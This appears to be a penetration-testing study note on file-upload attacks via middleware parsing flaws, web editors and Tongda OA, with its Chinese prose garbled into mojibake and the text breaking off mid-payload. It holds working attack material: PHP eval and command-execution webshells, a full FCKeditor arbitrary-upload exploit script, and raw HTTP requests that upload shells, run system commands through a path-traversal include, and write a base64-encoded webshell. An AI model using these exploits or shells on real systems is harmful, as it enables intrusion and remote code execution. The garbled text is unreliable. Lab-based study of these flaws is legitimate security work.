**å‰è¨€ï¼š**å…ˆåˆ¤æ–­ä¸­é—´ä»¶ï¼Œæ˜¯å¦æœ‰è§£ææ¼æ´ï¼Œå­—å…¸æ‰«ææ‹¿åˆ°ä¸Šä¼ ç‚¹ï¼Œæˆ–è€…ä¼šå‘˜ä¸­å¿ƒï¼Œæœ‰å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œè€Œåæµ‹è¯•ç»•è¿‡/éªŒè¯ï¼Œæ ¹æ®å®é™…æƒ…å†µåˆ¤æ–­æ˜¯ç™½åå•ã€é»‘åå•è¿˜æ˜¯å†…å®¹å…¶ä»–çš„ç»•è¿‡ï¼Œç»•è¿‡/éªŒè¯å’Œä¸­é—´ä»¶çš„è§£ææ¼æ´ä¹Ÿä¸è¡Œçš„è¯å°±çœ‹çœ‹CMSæ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œç„¶åçœ‹çœ‹ç¼–è¾‘å™¨æ¼æ´æœ‰æ— ä»¥åŠå…¶ä»–æ¼æ´å¦‚CVEæ¼æ´ã€‚

![](https://gitee.com/YatJay/image/raw/master/img/202202280942830.png)

# æ¶‰åŠçŸ¥è¯†

### å„ä¸ªå¹³å°è§£ææ¼æ´è®²è§£ 

[ğŸ“webä¸­é—´ä»¶å¸¸è§æ¼æ´æ€»ç»“.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/22078880/1629446612107-38c696ab-7332-41bf-b81a-c1ecb4eb0d0c.pdf)

### IIS,Apache,Nginx

ä¸»æµwebæœåŠ¡å™¨ï¼šApacheã€IISã€Nginx

#### Apache

Apacheæ˜¯ä¸–ç•Œä½¿ç”¨æ’åç¬¬ä¸€çš„WebæœåŠ¡å™¨è½¯ä»¶ã€‚å®ƒå¯ä»¥è¿è¡Œåœ¨å‡ ä¹æ‰€æœ‰å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—æœºå¹³å°ä¸Šï¼Œç”±äºå…¶è·¨å¹³å°å’Œå®‰å…¨æ€§è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ˜¯æœ€æµè¡Œçš„WebæœåŠ¡å™¨ç«¯è½¯ä»¶ä¹‹ä¸€ã€‚å®ƒå¿«é€Ÿã€å¯é å¹¶ä¸”å¯é€šè¿‡ç®€å•çš„APIæ‰©å……ï¼Œå°†Perl/Pythonç­‰è§£é‡Šå™¨ç¼–è¯‘åˆ°æœåŠ¡å™¨ä¸­ã€‚Apache HTTP  Serverï¼ˆç®€ç§°Apacheï¼‰æ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€ä¸ªå¼€æ”¾æºç çš„ç½‘é¡µæœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨å¤§å¤šæ•°è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­è¿è¡Œï¼Œç”±äºå…¶å¤šå¹³å°å’Œå®‰å…¨æ€§è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ˜¯æœ€æµè¡Œçš„WebæœåŠ¡å™¨ç«¯è½¯ä»¶ä¹‹ä¸€ã€‚å®ƒå¿«é€Ÿã€å¯é å¹¶ä¸”å¯é€šè¿‡ç®€å•çš„APIæ‰©å±•ï¼Œå°†Perl/Pythonç­‰è§£é‡Šå™¨ç¼–è¯‘åˆ°æœåŠ¡å™¨ä¸­ã€‚ApacheæºäºNCSAhttpdæœåŠ¡å™¨ï¼Œç»è¿‡å¤šæ¬¡ä¿®æ”¹ï¼Œæˆä¸ºä¸–ç•Œä¸Šæœ€æµè¡Œçš„WebæœåŠ¡å™¨è½¯ä»¶ä¹‹ä¸€ã€‚

#### IIS

IIS(Internet Information Services) æ˜¯ä¸€ä¸ªæ”¯æŒHTTPå’ŒFTPå‘å¸ƒæœåŠ¡çš„WebæœåŠ¡å™¨ã€‚å®ƒæ˜¯ç”±å¾®è½¯å¼€å‘çš„webæœåŠ¡å™¨ï¼Œéœ€è¦æ”¶è´¹ï¼Œä¸»è¦ç”¨æ¥è·‘asp.net asp phpï¼Œåªèƒ½åœ¨windowsä¸‹è¿è¡Œ

#### Nginx

Nginxæ˜¯lgor Sysoevä¸ºä¿„ç½—æ–¯è®¿é—®é‡ç¬¬äºŒçš„rambler.ruç«™ç‚¹è®¾è®¡å¼€å‘çš„ã€‚ä»2004å¹´å‘å¸ƒè‡³ä»Šï¼Œå‡­å€Ÿå¼€æºçš„åŠ›é‡ï¼Œå·²ç»æ¥è¿‘æˆç†Ÿä¸å®Œå–„ã€‚

NginxåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä½œä¸ºHTTPæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œé‚®ä»¶æœåŠ¡å™¨ã€‚æ”¯æŒFastCGIã€SSLã€Virtual Hostã€URL Rewriteã€Gzipç­‰åŠŸèƒ½ã€‚å¹¶ä¸”æ”¯æŒå¾ˆå¤šç¬¬ä¸‰æ–¹çš„æ¨¡å—æ‰©å±•ã€‚



ç›®å‰apacheå’Œnginxå¥½åƒè¿˜æ²¡æœ‰çœ‹åˆ°åƒIISä¸€æ ·çš„å¯è§†åŒ–é…ç½®ã€‚åœ¨windowså’Œlinuxä¸Šï¼Œapacheå’Œnginx éƒ½æ˜¯ä»¥ç¼–è¾‘é…ç½®æ–‡ä»¶çš„å½¢å¼æ¥é…ç½®ã€‚

###  å„ä¸ª WEB ç¼–è¾‘å™¨å®‰å…¨è®²è§£

ç½‘ç«™åå°é‡Œé¢æœ‰æ“ä½œæ·»åŠ æ–‡å­—ç­‰ç±»ä¼¼åŠŸèƒ½çš„æ—¶å€™ï¼Œæœ‰äº›ç½‘ç«™ä¼šå¥—ç”¨ç¬¬ä¸‰æ–¹çš„ç¼–è¾‘å™¨å»å¯¹æ–‡ç« ã€å›¾ç‰‡ã€éŸ³é¢‘ç­‰è¿›è¡Œç›¸å…³å¤„ç†ã€‚å¦‚æœä¸€ä¸ªç½‘ç«™é‡Œé¢æœ‰ç¼–è¾‘å™¨çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸ªç¼–è¾‘å™¨æ˜¯ä»€ä¹ˆç±»å‹ï¼Œæœ‰æ²¡æœ‰æ¼æ´ï¼Œä¹Ÿä¼šæˆä¸ºæˆ‘ä»¬åˆ©ç”¨çš„æ¡ä»¶

**ä¸€äº›ç½‘ç«™ä¹Ÿå¯é€šè¿‡æ‰«æè·å¾—ç¼–è¾‘å™¨ä¿¡æ¯ï¼Œåœ¨å…¶å®ƒåœ°æ–¹ä¸èƒ½çªç ´æ—¶å¯ä»¥åˆ©ç”¨ç¼–è¾‘å™¨çš„æ¼æ´è¿›è¡Œgetsellï¼Œå¯ä»¥åœ¨ç½‘ä¸Šæœç´¢ç›¸å…³ç¼–è¾‘å™¨æ¼æ´åˆ©ç”¨å³å¯ã€‚**

å¤§éƒ¨åˆ†çš„ç¼–è¾‘å™¨æ¼æ´éƒ½æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæˆ–è€…å½’ç±»äºç¬¬ä¸‰æ–¹è½¯ä»¶æ¼æ´ã€‚è¿™é‡Œå’Œæ–‡ä»¶ä¸Šä¼ é…åˆä½¿ç”¨ï¼Œå½’ç±»ä¸ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸€ç±»

### WEB ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ

[WEBç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ](https://navisec.it/)

æœ‰çš„ç½‘ç«™ä¸­å¯èƒ½åµŒå…¥ç¬¬ä¸‰æ–¹webç¼–è¾‘è½¯ä»¶æ¯”å¦‚ï¼šfckeditorã€ewebeditorã€ckeditorã€kineditorç­‰ã€‚

ä¸€äº›ç½‘ç«™ä¹Ÿå¯é€šè¿‡æ‰«æè·å¾—ç¼–è¾‘å™¨ä¿¡æ¯ï¼Œåœ¨å…¶å®ƒåœ°æ–¹ä¸èƒ½çªç ´æ—¶å¯ä»¥åˆ©ç”¨ç¼–è¾‘å™¨çš„æ¼æ´è¿›è¡Œgetsellï¼Œå¯ä»¥åœ¨ç½‘ä¸Šæœç´¢ç›¸å…³ç¼–è¾‘å™¨æ¼æ´åˆ©ç”¨å³å¯

### å„ä¸ª CMS æ–‡ä»¶ä¸Šä¼ ç®€è¦è®²è§£

### wordpress,phpcms

WordPressï¼šhttps://baike.baidu.com/item/WordPress/450615?fr=aladdin

phpcmsï¼šhttps://baike.baidu.com/item/phpcms/1997053?fr=aladdin

# æ¼”ç¤ºæ¡ˆä¾‹

## å‡ ç§ä¸­é—´ä»¶è§£ææ¼æ´ç®€è¦æ¼”ç¤º

### å‚è€ƒä¸­é—´ä»¶è§£ææ¼æ´PDF



### IIS6/7è§£ææ¼æ´ç®€è¦è¯´æ˜â€”â€”æœ¬åœ°æ­å»º

æ­å»ºæ•™ç¨‹ï¼š[æœ¬åœ°æ­å»ºiisæœåŠ¡å™¨](https://blog.csdn.net/qq_33633147/article/details/87912179)



### Apacheé…ç½®å®‰å…¨â€”â€”vulhub



### Apacheè§£ææ¼æ´â€”â€”ä½ç‰ˆæœ¬

#### æ¼æ´

åœ¨ä½ç‰ˆæœ¬çš„apacheä¸­,è‹¥æ–‡ä»¶åç¼€`x.php.xxx.yyy`ï¼Œåœ¨æœåŠ¡å™¨å…ˆè¯†åˆ«`.yyy`åç¼€ï¼Œå‘ç°ä¸è¯†åˆ«ï¼Œå°±å‘å‰è§£æï¼Œç›´åˆ°è¯†åˆ«ä¸ºæ­¢ï¼Œæœ€ç»ˆè¯†åˆ«è§£æä¸ºphpæ–‡ä»¶

#### åˆ©ç”¨åœºæ™¯

è‹¥æ¢æµ‹åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶Apacheä¸ºè¾ƒä½ç‰ˆæœ¬çš„è¯,æˆ‘ä»¬åˆ©ç”¨**æ–‡ä»¶ä¸Šä¼ **ï¼Œä¸Šä¼ ä¸€ä¸ªä¸è¢«è¯†åˆ«çš„æ–‡ä»¶åç¼€ï¼Œåˆ©ç”¨è§£æ¼æ´è§„åˆ™æˆåŠŸè§£æè¯¥æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­çš„åé—¨ä»£ç å°±ä¼šè¢«è§¦å‘ã€‚
#### æ¼æ´å¤ç°
å‡†å¤‡ä¸¤ä¸ªåé—¨æ–‡ä»¶ï¼Œä¸€ä¸ªæ­£å¸¸phpåç¼€ï¼Œä¸€ä¸ªphp.xxxåç¼€ã€‚å‡è®¾äºŒè€…å·²ç»ç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„è¿‡æ»¤æœºåˆ¶æˆåŠŸä¸Šä¼ ï¼Œè¿›è¡Œè®¿é—®

![](https://gitee.com/YatJay/image/raw/master/img/202202282053783.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202282053211.png)

æˆåŠŸè§£æ`shell.php.xxx`ï¼š

![img](https://gitee.com/YatJay/image/raw/master/img/202202282053970.png)





### Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰â€”â€”vulhub

#### æ¼æ´

Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ`1.php\x0A`å°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚

#### æ¼æ´å¤ç°

å¯åŠ¨æ¼æ´ç¯å¢ƒ

![](https://gitee.com/YatJay/image/raw/master/img/202203011023294.png)

![](https://gitee.com/YatJay/image/raw/master/img/202203011025297.png)

å‡†å¤‡`shell.php`æ–‡ä»¶

```php
<?php 
    @eval($_POST['shell']);
    phpinfo();
?>
```

ä¸Šä¼ ä¸€ä¸ªåä¸º`shell.php`çš„æ–‡ä»¶ï¼ŒPOSTæäº¤å‚æ•°nameå€¼ä¸º`evil.php`ï¼Œè¢«æ‹¦æˆªï¼š

![](https://gitee.com/YatJay/image/raw/master/img/202203011027731.png)

åœ¨ä¸Šè¿°POSTæäº¤çš„æ–‡ä»¶å`evil.php`åé¢æ’å…¥ä¸€ä¸ª`\x0A`ï¼ˆæ³¨æ„ï¼Œä¸èƒ½æ˜¯`\x0D\x0A`ï¼Œåªèƒ½æ˜¯ä¸€ä¸ª`\x0A`ï¼Œå¯ä½¿ç”¨åå…­è¿›åˆ¶æ•°æ®æ ¼å¼ä¿®æ”¹æ·»åŠ ï¼‰ï¼Œä¸å†æ‹¦æˆªï¼š

![](https://gitee.com/YatJay/image/raw/master/img/202203011029808.png)

è®¿é—®åˆšæ‰ä¸Šä¼ çš„`IP:8080/evil.php%0a`ï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè§£æï¼Œä½†è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯phpåç¼€ï¼Œè¯´æ˜ç›®æ ‡å­˜åœ¨è§£ææ¼æ´ï¼š

![](https://gitee.com/YatJay/image/raw/master/img/202203011032726.png)

### Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´(CVE-2013-4547) â€”â€”vulhub

#### æ¼æ´

å½±å“ç‰ˆæœ¬ï¼š Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7  

è¿™ä¸ªæ¼æ´å…¶å®å’Œä»£ç æ‰§è¡Œæ²¡æœ‰å¤ªå¤§å…³ç³»ï¼Œå…¶ä¸»è¦åŸå› æ˜¯é”™è¯¯åœ°è§£æäº†è¯·æ±‚çš„URIï¼Œé”™è¯¯åœ°è·å–åˆ°ç”¨æˆ·è¯·æ±‚çš„æ–‡ä»¶åï¼Œå¯¼è‡´å‡ºç°æƒé™ç»•è¿‡ã€ä»£ç æ‰§è¡Œçš„è¿å¸¦å½±å“ã€‚

ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ï¼ŒNginxåŒ¹é…åˆ°.phpç»“å°¾çš„è¯·æ±‚ï¼Œå°±å‘é€ç»™fastcgiè¿›è¡Œè§£æï¼Œå¸¸è§çš„å†™æ³•å¦‚ä¸‹ï¼š

```
location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}
```

æ­£å¸¸æƒ…å†µä¸‹ï¼ˆå…³é—­pathinfoçš„æƒ…å†µä¸‹ï¼‰ï¼Œåªæœ‰.phpåç¼€çš„æ–‡ä»¶æ‰ä¼šè¢«å‘é€ç»™fastcgiè§£æã€‚

è€Œå­˜åœ¨CVE-2013-4547çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¯·æ±‚`1.gif[0x20][0x00].php`ï¼Œè¿™ä¸ªURIå¯ä»¥åŒ¹é…ä¸Šæ­£åˆ™`\.php$`ï¼Œå¯ä»¥è¿›å…¥è¿™ä¸ªLocationå—ï¼›ä½†è¿›å…¥åï¼ŒNginxå´é”™è¯¯åœ°è®¤ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯`1.gif[0x20]`ï¼Œå°±è®¾ç½®å…¶ä¸º`SCRIPT_FILENAME`çš„å€¼å‘é€ç»™fastcgiã€‚

fastcgiæ ¹æ®`SCRIPT_FILENAME`çš„å€¼è¿›è¡Œè§£æï¼Œæœ€åé€ æˆäº†è§£ææ¼æ´ã€‚

æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªç©ºæ ¼ç»“å°¾çš„æ–‡ä»¶ï¼Œå³å¯ä½¿PHPè§£æä¹‹ã€‚

å†ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚å¾ˆå¤šç½‘ç«™é™åˆ¶äº†å…è®¸è®¿é—®åå°çš„IPï¼š

```
location /admin/ {
    allow 127.0.0.1;
    deny all;
}
```

æˆ‘ä»¬å¯ä»¥è¯·æ±‚å¦‚ä¸‹URIï¼š`/test[0x20]/../admin/index.php`ï¼Œè¿™ä¸ªURIä¸ä¼šåŒ¹é…ä¸Šlocationåé¢çš„`/admin/`ï¼Œä¹Ÿå°±ç»•è¿‡äº†å…¶ä¸­çš„IPéªŒè¯ï¼›ä½†æœ€åè¯·æ±‚çš„æ˜¯`/test[0x20]/../admin/index.php`æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯`/admin/index.php`ï¼ŒæˆåŠŸè®¿é—®åˆ°åå°ã€‚ï¼ˆè¿™ä¸ªå‰ææ˜¯éœ€è¦æœ‰ä¸€ä¸ªç›®å½•å«â€œtest â€ï¼šè¿™æ˜¯Linuxç³»ç»Ÿçš„ç‰¹ç‚¹ï¼Œå¦‚æœæœ‰ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œåˆ™å³ä½¿è·³è½¬åˆ°ä¸Šä¸€å±‚ï¼Œä¹Ÿä¼šçˆ†æ–‡ä»¶ä¸å­˜åœ¨çš„é”™è¯¯ï¼ŒWindowsä¸‹æ²¡æœ‰è¿™ä¸ªé™åˆ¶ï¼‰

#### æ¼æ´å¤ç°

ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—®`http://your-ip:8080/`å³å¯çœ‹åˆ°ä¸€ä¸ªä¸Šä¼ é¡µé¢ã€‚

![](https://gitee.com/YatJay/image/raw/master/img/202203011044004.png)

è¿™ä¸ªç¯å¢ƒæ˜¯é»‘åå•éªŒè¯ï¼Œæˆ‘ä»¬æ— æ³•ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶

![](https://gitee.com/YatJay/image/raw/master/img/202203011046004.png)

éœ€è¦åˆ©ç”¨CVE-2013-4547ã€‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªâ€œwebshell.jpg â€çš„å›¾ç‰‡é©¬ï¼Œæ³¨æ„åé¢çš„ç©ºæ ¼ï¼š

![](https://gitee.com/YatJay/image/raw/master/img/202203011049895.png)

è®¿é—®`http://your-ip:8080/uploadfiles/webshell.jpg.php`, å¹¶æŠ“åŒ…ï¼Œ ä¿®æ”¹ä¸ºwebshell.jpg...php, åœ¨Hexé€‰ä¿®å¡ä¸­å°†jpgåé¢çš„ä¸¤ä¸ªç‚¹2eæ”¹æˆ20,00ï¼Œç‚¹å‡»Go,å¦‚ä¸‹ã€‚  

==/////////////////////////////////////==

è®¿é—®`http://your-ip:8080/uploadfiles/webshell.jpg[0x20][0x00].php`ï¼Œå³å¯å‘ç°PHPå·²è¢«è§£æï¼š

![img](https://vulhub.org/vulhub/nginx/CVE-2013-4547/02.png)

æ³¨æ„ï¼Œ[0x20]æ˜¯ç©ºæ ¼ï¼Œ[0x00]æ˜¯`\0`ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦éƒ½ä¸éœ€è¦ç¼–ç ã€‚

### Nginxè§£ææ¼æ´ â€”â€”vulhub

è§ä¸Šä¸€èŠ‚

## å‡ ç§å¸¸è§webç¼–è¾‘å™¨ç®€è¦æ¼”ç¤º

### FCKeditor expåˆ©ç”¨

fckeditorçš„æ„ä»¶ç»„æˆå¦‚ä¸‹å›¾æ‰€ç¤º

![img](https://gitee.com/YatJay/image/raw/master/img/202203011654623.png)

ä½†åœ¨å®é™…æƒ…å†µä¸‹webç¼–è¾‘å™¨æ˜¯è¿™æ ·çš„

![img](https://gitee.com/YatJay/image/raw/master/img/202203011654496.png)

EXPæºç 

```php
<?php
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
$match = array();
function http_send($host, $packet)
{
$sock = fsockopen($host, 80);
while (!$sock)
{
print "\n[-] No response from {$host}:80 Trying again...";
$sock = fsockopen($host, 80);
}
fputs($sock, $packet);
while (!feof($sock)) $resp .= fread($sock, 1024);
fclose($sock);
print $resp;
return $resp;
}
function connector_response($html)
{
global $match;
return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
}
print "\n+------------------------------------------------------------------+";
print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";
print "\n+------------------------------------------------------------------+\n";
if ($argc < 3)
{
print "\nUsage......: php $argv[0] host path\n";
print "\nExample....: php $argv[0] localhost /\n";
print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
die();
}
$host = $argv[1];
$path = ereg_replace("(/){2,}", "/", $argv[2]);
$filename = "fvck.gif";
$foldername = "fuck.php%00.gif";
$connector = "editor/filemanager/connectors/php/connector.php";
$payload = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type: image/jpeg\r\n\r\n";
$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[cmd]) ?>'."\n";
$payload .= "-----------------------------265001916915724--\r\n";
$packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=".$foldername." HTTP/1.0\r\n";//print $packet;
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
print $packet;
if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
else print "\n[-] Job done! try http://${host}/$match[2] \n";
?>
```

#### ç°æˆexpåˆ©ç”¨æ–¹æ³•

å°†è¯¥EXPå‘½åä¸º`fck.php`ï¼Œå°†è¯¥æ–‡ä»¶æ‹–åˆ°PHPçš„å®‰è£…ç›®å½•

![img](https://gitee.com/YatJay/image/raw/master/img/202203011654917.png)

åœ¨è¯¥ç›®å½•æ‰“å¼€cmdï¼Œæˆ–è€…åˆ›å»ºå½“å‰ä¼šè¯cmd.batæ‰“å¼€

![img](https://gitee.com/YatJay/image/raw/master/img/202203011655137.png)

 åˆ©ç”¨PHPçš„EXPè¿›è¡Œæ‰§è¡Œ

![img](https://gitee.com/YatJay/image/raw/master/img/202203011655548.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202203011655964.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202203011655464.png)

åˆ©ç”¨è¯¥expè¿›è¡Œè‡ªåŠ¨æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œæç¤ºå°è¯•è®¿é—®çš„åœ°å€å¦‚ä¸‹æ‰€ç¤º

![img](https://gitee.com/YatJay/image/raw/master/img/202203011655406.png)

è¯¥åœ°å€ä¸‹å‡ºç°äº†ä¸Šä¼ çš„åŒ…å«åé—¨ä»£ç çš„è„šæœ¬ï¼Œå³æˆåŠŸä¸Šä¼ åé—¨

![](https://gitee.com/YatJay/image/raw/master/img/202203011659985.png)

#### å¦‚ä½•åˆ¤å®šå¯¹æ–¹ä½¿ç”¨fckeditorç¼–è¾‘å™¨

1. ä½¿ç”¨å·¥å…·è¿›è¡Œç›®å½•æ‰«æå‘ç°

2. inurlè¿›è¡Œæœç´¢ï¼Œæœå‡ºä½¿ç”¨è¯¥ç¼–è¯‘å™¨çš„ç½‘ç«™

<img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629511424173-6e549f52-0d9e-4b7b-aab1-0a0df2155af8.png" alt="img"  />

<img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629511505184-713a2ee1-f9f9-4826-841f-f7edb3e39298.png" alt="img"  />

![img](https://gitee.com/YatJay/image/raw/master/img/202203011655949.png)

### ueditor æ¼æ´åˆ©ç”¨

https://zhuanlan.zhihu.com/p/85265552

### CMS æ–‡ä»¶ä¸Šä¼ ç®€è¦æ¼”ç¤ºâ€”â€”é€šè¾¾ OA ç³»ç»Ÿ

ä¸‹è½½åå®‰è£…ï¼Œå¯åŠ¨è¯¥ç³»ç»Ÿ

![img](https://gitee.com/YatJay/image/raw/master/img/202203011710419.png)

é»˜è®¤ç”¨æˆ·adminå¯†ç ä¸ºç©ºã€‚

ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå³é”®é¼ æ ‡æ‰“å¼€æºç ï¼Œå¯ä»¥æŸ¥çœ‹ç›®æ ‡ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆOAç³»ç»Ÿ

![img](https://gitee.com/YatJay/image/raw/master/img/202203011711888.png)

##### ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´

è·¯å¾„ä¸ºï¼šispirit/im/upload.php

æŠ“åŒ…æ„é€ POCï¼š

```plain
POST /ispirit/im/upload.php HTTP/1.1
Host: localhost:999
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Cookie: PHPSESSID=123
Connection: close
Content-Length: 660
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"
2
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"
123
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"
1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg
<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
------WebKitFormBoundarypyfBh1YB4pV8McGB--
```

å‘é€POC:

![img](https://gitee.com/YatJay/image/raw/master/img/202203011918952.png)

æŸ¥çœ‹ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ï¼š

![img](https://gitee.com/YatJay/image/raw/master/img/202203011918180.png)

å‰å°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä¿®æ”¹æ•°æ®åŒ…ï¼ŒåŒ…å«å‰é¢ä¸Šä¼ çš„jpgæœ¨é©¬æ–‡ä»¶ï¼Œå³å¯å®ç°æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ­¤å¤„æ‰§è¡Œå‘½ä»¤â€œnet userâ€

```plain
POST /ispirit/interface/gateway.php HTTP/1.1
Host: localhost:999
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
json={"url":"/general/../../attach/im/2108/1005943624.jpg"}&cmd=net user
```

![img](https://gitee.com/YatJay/image/raw/master/img/202203011918191.png)

æ‰§è¡Œå‘½ä»¤â€œipconfigâ€:

![img](https://gitee.com/YatJay/image/raw/master/img/202203011918125.png)

2.getshell

å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼šæŠ“å–ä»»æ„æ•°æ®åŒ…ï¼Œä¿®æ”¹æ•°æ®åŒ…è¿›è¡Œé‡æ”¾ï¼Œä¸Šä¼ åç¼€ä¸ºjpgçš„æœ¨é©¬æ–‡ä»¶ï¼ˆæœ¨é©¬æ–‡ä»¶æ‰§è¡Œå†™å…¥æ–‡ä»¶æ“ä½œï¼‰

```plain
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Cookie: PHPSESSID=123
Connection: close
Content-Length: 1398
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"
2
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"
123
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"
1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg
<?php
$fp = fopen('shell.php', 'w');
$a = base64_decode("PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC  Ã¿
